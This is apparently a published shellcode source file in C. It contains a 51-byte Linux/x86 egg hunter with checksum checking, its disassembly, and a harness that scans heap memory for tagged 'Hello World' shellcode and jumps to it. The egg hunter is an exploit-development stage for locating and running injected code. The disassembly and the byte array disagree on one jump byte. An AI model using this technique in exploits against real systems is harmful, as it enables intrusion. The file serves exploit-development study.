/* 
*  Title:    Egg Hunter Shellcode - 51 bytes
*  Platform: Linux/x86
*  Date:     13 September 2018
*  Author:   Ray Doyle (@doylersec)
*  Website:  http://www.doyler.net
*  
*  For more information on this shellcode, please see the following blog post:
*  https://www.doyler.net/security-not-included/egg-hunter-shellcode
*/

/****************************************************
Disassembly of section .text:

08048060 <_start>:
 8048060:	fc                   	cld    

08048061 <page_align>:
 8048061:	66 81 c9 ff 0f       	or     cx,0xfff

08048066 <page_inc>:
 8048066:	41                   	inc    ecx

08048067 <sigaction>:
 8048067:	6a 43                	push   0x43
 8048069:	58                   	pop    eax
 804806a:	cd 80                	int    0x80

0804806c <check_mem>:
 804806c:	3c f2                	cmp    al,0xf2
 804806e:	74 f1                	je     8048061 <page_align>

08048070 <check_egg>:
 8048070:	b8 5b 53 58 50       	mov    eax,0x5058535b
 8048075:	89 cf                	mov    edi,ecx
 8048077:	af                   	scas   eax,DWORD PTR es:[edi]
 8048078:	75 ec                	jne    8048066 <page_inc>
 804807a:	af                   	scas   eax,DWORD PTR es:[edi]
 804807b:	75 e9                	jne    8048066 <page_inc>

0804807d <find_egg>:
 804807d:	51                   	push   ecx
 804807e:	31 c9                	xor    ecx,ecx
 8048080:	31 c0                	xor    eax,eax

08048082 <calc_chksum_loop>:
 8048082:	02 04 0f             	add    al,BYTE PTR [edi+ecx*1]
 8048085:	41                   	inc    ecx
 8048086:	80 f9 2b             	cmp    cl,0x2b
 8048089:	75 f7                	jne    8048082 <calc_chksum_loop>

0804808b <test_ckksum>:
 804808b:	3a 04 0f             	cmp    al,BYTE PTR [edi+ecx*1]
 804808e:	59                   	pop    ecx
 804808f:	75 d0                	jne    8048061 <page_align>

08048091 <execute>:
 8048091:	ff e7                	jmp    edi
****************************************************/

#include<stdlib.h>
#include<stdio.h>
#include<string.h>

// EGG - PUSH eax, POP eax, PUSH ebx, POP ebx
#define EGG "\x5b\x53\x58\x50"

// Egg Hunter w/ integrity checking (51 bytes, 50 without first instruction (cld))
unsigned char egghunter[] = \
"\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8"
EGG
"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\x51\x31\xc9\x31\xc0\x02\x04\x0f\x41\x80\xf9\x2b\x75\xf7\x3a\x04\x0f\x59\x75\xd5\xff\xe7";

// Proper shellcode with improper checksum byte
unsigned char badcode1[] = \
EGG
EGG
"\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x52\x6a\x0a\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
"\x01";

// Improper shellcode (bytes missing from middle) with proper checksum byte
unsigned char badcode2[] = \
EGG
EGG
"\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
"\x66";

// Hello World shellcode with prepended eggs
unsigned char code[] = \
EGG
EGG
"\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x52\x6a\x0a\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
"\x66";

// Only one egg
unsigned char badcode3[] = \
EGG
"\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x52\x6a\x0a\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\x90\x90\x90\x90"
"\x66";

main()
{
    char *heap;
    heap = malloc(1000);

    // Idea from the RCEsecurity post - https://www.rcesecurity.com/2014/08/slae-egg-hunters-linux-x86/
    printf("\nMemory location of heap: %p\n", heap);

    memcpy(heap, badcode1, sizeof(badcode1));
    memcpy(heap + sizeof(badcode1), badcode2, sizeof(badcode2));
    memcpy(heap + sizeof(badcode1) + sizeof(badcode2), code, sizeof(code));
    memcpy(heap + sizeof(badcode1) + sizeof(badcode2) + sizeof(code), badcode3, sizeof(badcode3));

    printf("\nEgg Hunter Length: %d\n", strlen(egghunter));
    printf("Shellcode Length: %d\n\n", strlen(code));

    int (*ret)() = (int(*)())egghunter;

    ret();
}